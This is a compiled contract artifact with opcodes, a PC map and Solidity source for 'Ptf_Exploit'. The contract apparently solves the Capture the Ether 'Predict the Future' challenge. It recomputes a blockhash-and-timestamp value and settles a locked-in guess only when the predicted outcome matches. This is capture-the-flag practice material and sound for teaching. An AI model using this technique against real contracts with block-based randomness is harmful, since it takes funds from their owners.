  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x40 JUMPI PUSH4 0xFFFFFFFF PUSH29 0x100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 CALLDATALOAD DIV AND PUSH4 0x63D9B770 DUP2 EQ PUSH2 0x42 JUMPI JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x4E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 DUP1 MLOAD PUSH1 0x0 NOT NUMBER ADD BLOCKHASH DUP2 MSTORE TIMESTAMP PUSH1 0x20 DUP3 ADD MSTORE DUP2 MLOAD SWAP1 DUP2 SWAP1 SUB SWAP1 SWAP2 ADD SWAP1 KECCAK256 PUSH2 0x40 SWAP1 PUSH1 0xA PUSH1 0xFF SWAP2 DUP3 AND MOD SWAP1 DUP2 AND PUSH1 0x5 EQ ISZERO PUSH2 0x103 JUMPI PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH32 0x11DA60B400000000000000000000000000000000000000000000000000000000 DUP2 MSTORE SWAP1 MLOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF SWAP1 SWAP3 AND SWAP3 PUSH4 0x11DA60B4 SWAP3 PUSH1 0x4 DUP1 DUP5 ADD SWAP4 DUP3 SWAP1 SUB ADD DUP2 DUP4 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xEA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xFE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST POP JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xcc CALLDATACOPY GAS 0xaf DUP2 0xbd STOP JUMP 0xf8 0xf8 PC XOR DUP14 EXP PUSH28 0xE79226C3382FE12A1BC6F78A6F7D44ECE10029000000000000000000 ",
  "pcMap": {
    "0": {
      "offset": [
        209,
        695
      ],
      "op": "PUSH1",
      "path": "1",
      "value": "0x80"
    },
    "2": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "PUSH1",
      "path": "1",
      "value": "0x40"
    },
    "4": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "MSTORE",
      "path": "1"
    },
    "5": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "PUSH1",
      "path": "1",
      "value": "0x4"
    },
    "7": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "CALLDATASIZE",
      "path": "1"
    },
    "8": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "LT",
      "path": "1"
    },
    "9": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "PUSH2",
      "path": "1",
      "value": "0x40"
    },
    "12": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "JUMPI",
      "path": "1"
    },
    "13": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "PUSH4",
      "path": "1",
      "value": "0xFFFFFFFF"
    },
    "18": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "PUSH29",
      "path": "1",
      "value": "0x100000000000000000000000000000000000000000000000000000000"
    },
    "48": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "PUSH1",
      "path": "1",
      "value": "0x0"
    },
    "50": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "CALLDATALOAD",
      "path": "1"
    },
    "51": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "DIV",
      "path": "1"
    },
    "52": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "AND",
      "path": "1"
    },
    "53": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "PUSH4",
      "path": "1",
      "value": "0x63D9B770"
    },
    "58": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "DUP2",
      "path": "1"
    },
    "59": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "EQ",
      "path": "1"
    },
    "60": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "PUSH2",
      "path": "1",
      "value": "0x42"
    },
    "63": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "JUMPI",
      "path": "1"
    },
    "64": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "JUMPDEST",
      "path": "1"
    },
    "65": {
      "fn": null,
      "offset": [
        209,
        695
      ],
      "op": "STOP",
      "path": "1"
    },
    "66": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        459,
        657
      ],
      "op": "JUMPDEST",
      "path": "1"
    },
    "67": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        459,
        657
      ],
      "op": "CALLVALUE",
      "path": "1"
    },
    "68": {
      "op": "DUP1"
    },
    "69": {
      "op": "ISZERO"
    },
    "70": {
      "op": "PUSH2",
      "value": "0x4E"
    },
    "73": {
      "op": "JUMPI"
    },
    "74": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "76": {
      "op": "DUP1"
    },
    "77": {
      "dev": "Cannot send ether to nonpayable function",
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        459,
        657
      ],
      "op": "REVERT",
      "path": "1"
    },
    "78": {
      "op": "JUMPDEST"
    },
    "79": {
      "op": "POP"
    },
    "80": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "PUSH1",
      "path": "1",
      "value": "0x40"
    },
    "82": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "DUP1",
      "path": "1"
    },
    "83": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "MLOAD",
      "path": "1"
    },
    "84": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "86": {
      "op": "NOT"
    },
    "87": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        539,
        551
      ],
      "op": "NUMBER",
      "path": "1"
    },
    "88": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        539,
        555
      ],
      "op": "ADD",
      "path": "1"
    },
    "89": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        523,
        556
      ],
      "op": "BLOCKHASH",
      "path": "1"
    },
    "90": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "DUP2",
      "path": "1"
    },
    "91": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "MSTORE",
      "path": "1"
    },
    "92": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        558,
        561
      ],
      "op": "TIMESTAMP",
      "path": "1"
    },
    "93": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "PUSH1",
      "path": "1",
      "value": "0x20"
    },
    "95": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "DUP3",
      "path": "1"
    },
    "96": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "ADD",
      "path": "1"
    },
    "97": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "MSTORE",
      "path": "1"
    },
    "98": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "DUP2",
      "path": "1"
    },
    "99": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "MLOAD",
      "path": "1"
    },
    "100": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "SWAP1",
      "path": "1"
    },
    "101": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "DUP2",
      "path": "1"
    },
    "102": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "SWAP1",
      "path": "1"
    },
    "103": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "SUB",
      "path": "1"
    },
    "104": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "SWAP1",
      "path": "1"
    },
    "105": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "SWAP2",
      "path": "1"
    },
    "106": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "ADD",
      "path": "1"
    },
    "107": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "SWAP1",
      "path": "1"
    },
    "108": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        513,
        562
      ],
      "op": "KECCAK256",
      "path": "1"
    },
    "109": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        459,
        657
      ],
      "op": "PUSH2",
      "path": "1",
      "value": "0x40"
    },
    "112": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        459,
        657
      ],
      "op": "SWAP1",
      "path": "1"
    },
    "113": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        578,
        580
      ],
      "op": "PUSH1",
      "path": "1",
      "value": "0xA"
    },
    "115": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        507,
        580
      ],
      "op": "PUSH1",
      "path": "1",
      "value": "0xFF"
    },
    "117": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        507,
        580
      ],
      "op": "SWAP2",
      "path": "1"
    },
    "118": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        507,
        580
      ],
      "op": "DUP3",
      "path": "1"
    },
    "119": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        507,
        580
      ],
      "op": "AND",
      "path": "1"
    },
    "120": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        507,
        580
      ],
      "op": "MOD",
      "path": "1"
    },
    "121": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        507,
        580
      ],
      "op": "SWAP1",
      "path": "1"
    },
    "122": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        594,
        612
      ],
      "op": "DUP2",
      "path": "1"
    },
    "123": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        594,
        612
      ],
      "op": "AND",
      "path": "1"
    },
    "124": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        607,
        611
      ],
      "op": "PUSH1",
      "path": "1",
      "value": "0x5"
    },
    "126": {
      "branch": 1,
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        594,
        612
      ],
      "op": "EQ",
      "path": "1"
    },
    "127": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        590,
        651
      ],
      "op": "ISZERO",
      "path": "1"
    },
    "128": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        590,
        651
      ],
      "op": "PUSH2",
      "path": "1",
      "value": "0x103"
    },
    "131": {
      "branch": 1,
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        590,
        651
      ],
      "op": "JUMPI",
      "path": "1"
    },
    "132": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        631
      ],
      "op": "PUSH1",
      "path": "1",
      "statement": 0,
      "value": "0x0"
    },
    "134": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        631
      ],
      "op": "DUP1",
      "path": "1"
    },
    "135": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        631
      ],
      "op": "SLOAD",
      "path": "1"
    },
    "136": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "PUSH1",
      "path": "1",
      "value": "0x40"
    },
    "138": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "DUP1",
      "path": "1"
    },
    "139": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "MLOAD",
      "path": "1"
    },
    "140": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "PUSH32",
      "path": "1",
      "value": "0x11DA60B400000000000000000000000000000000000000000000000000000000"
    },
    "173": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "DUP2",
      "path": "1"
    },
    "174": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "MSTORE",
      "path": "1"
    },
    "175": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "SWAP1",
      "path": "1"
    },
    "176": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "MLOAD",
      "path": "1"
    },
    "177": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        631
      ],
      "op": "PUSH20",
      "path": "1",
      "value": "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
    },
    "198": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        631
      ],
      "op": "SWAP1",
      "path": "1"
    },
    "199": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        631
      ],
      "op": "SWAP3",
      "path": "1"
    },
    "200": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        631
      ],
      "op": "AND",
      "path": "1"
    },
    "201": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        631
      ],
      "op": "SWAP3",
      "path": "1"
    },
    "202": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        638
      ],
      "op": "PUSH4",
      "path": "1",
      "value": "0x11DA60B4"
    },
    "207": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        638
      ],
      "op": "SWAP3",
      "path": "1"
    },
    "208": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "PUSH1",
      "path": "1",
      "value": "0x4"
    },
    "210": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "DUP1",
      "path": "1"
    },
    "211": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "DUP5",
      "path": "1"
    },
    "212": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "ADD",
      "path": "1"
    },
    "213": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "SWAP4",
      "path": "1"
    },
    "214": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "DUP3",
      "path": "1"
    },
    "215": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "SWAP1",
      "path": "1"
    },
    "216": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "SUB",
      "path": "1"
    },
    "217": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "ADD",
      "path": "1"
    },
    "218": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "DUP2",
      "path": "1"
    },
    "219": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        631
      ],
      "op": "DUP4",
      "path": "1"
    },
    "220": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        631
      ],
      "op": "DUP8",
      "path": "1"
    },
    "221": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "DUP1",
      "path": "1"
    },
    "222": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "EXTCODESIZE",
      "path": "1"
    },
    "223": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "ISZERO",
      "path": "1"
    },
    "224": {
      "op": "DUP1"
    },
    "225": {
      "op": "ISZERO"
    },
    "226": {
      "op": "PUSH2",
      "value": "0xEA"
    },
    "229": {
      "op": "JUMPI"
    },
    "230": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "232": {
      "op": "DUP1"
    },
    "233": {
      "op": "REVERT"
    },
    "234": {
      "op": "JUMPDEST"
    },
    "235": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "POP",
      "path": "1"
    },
    "236": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "GAS",
      "path": "1"
    },
    "237": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "CALL",
      "path": "1"
    },
    "238": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "ISZERO",
      "path": "1"
    },
    "239": {
      "op": "DUP1"
    },
    "240": {
      "op": "ISZERO"
    },
    "241": {
      "op": "PUSH2",
      "value": "0xFE"
    },
    "244": {
      "op": "JUMPI"
    },
    "245": {
      "op": "RETURNDATASIZE"
    },
    "246": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "248": {
      "op": "DUP1"
    },
    "249": {
      "op": "RETURNDATACOPY"
    },
    "250": {
      "op": "RETURNDATASIZE"
    },
    "251": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "253": {
      "op": "REVERT"
    },
    "254": {
      "op": "JUMPDEST"
    },
    "255": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "POP",
      "path": "1"
    },
    "256": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "POP",
      "path": "1"
    },
    "257": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "POP",
      "path": "1"
    },
    "258": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        628,
        640
      ],
      "op": "POP",
      "path": "1"
    },
    "259": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        590,
        651
      ],
      "op": "JUMPDEST",
      "path": "1"
    },
    "260": {
      "fn": "Ptf_Exploit.exploit",
      "offset": [
        459,
        657
      ],
      "op": "POP",
      "path": "1"
    },
    "261": {
      "fn": "Ptf_Exploit.exploit",
      "jump": "o",
      "offset": [
        459,
        657
      ],
      "op": "JUMP",
      "path": "1"
    }
  },
  "sha1": "80dd64c2a54c316d5ede565911903c6b23566299",
  "source": "pragma solidity ^0.4.21;\n\ninterface PredictTheFutureChallenge {\n    function isComplete() external view returns (bool);\n\n    function lockInGuess(uint8 n) external payable;\n\n    function settle() external;\n}\n\ncontract Ptf_Exploit {\n    PredictTheFutureChallenge ptf;\n\n    constructor(address _address) payable {\n        require(msg.value == 1 ether);\n        ptf = PredictTheFutureChallenge(_address);\n        ptf.lockInGuess.value(1 ether)(0x05);\n    }\n\n    function exploit() public {\n        uint8 ans = uint8(keccak256(block.blockhash(block.number - 1), now)) %\n            10;\n        if (ans == uint8(0x05)) {\n            ptf.settle();\n        }\n    }\n\n    function() external payable {}\n}\n",
  "sourceMap": "209:486:1:-;;;272:181;;;;;;;;;;;;341:7;328:9;:20;320:29;;;;;;359:3;:41;;-1:-1:-1;;;;;;359:41:1;-1:-1:-1;;;;;359:41:1;;;;;;;;;;410:36;;;;;;441:4;410:36;;;;;;:3;;;;;:15;;432:7;;410:36;;;;;359:3;410:36;;;;;432:7;410:3;:36;;;5:2:-1;;;;30:1;27;20:12;5:2;410:36:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;410:36:1;;;;;272:181;209:486;;;;;;",
  "sourcePath": "contracts/Ptf_Exploit.sol",
  "type": "contract"
}